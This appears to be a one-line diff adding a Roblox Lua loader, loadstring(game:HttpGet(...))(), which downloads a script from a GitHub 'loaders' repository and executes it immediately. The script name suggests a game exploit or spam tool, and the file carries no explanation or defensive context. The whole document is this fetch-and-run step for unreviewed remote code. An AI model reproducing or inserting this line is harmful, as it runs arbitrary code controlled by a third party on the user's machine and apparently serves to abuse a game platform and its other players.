@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/nuke-a-country-spam5-ujk1i6elktm98t.lua"))()
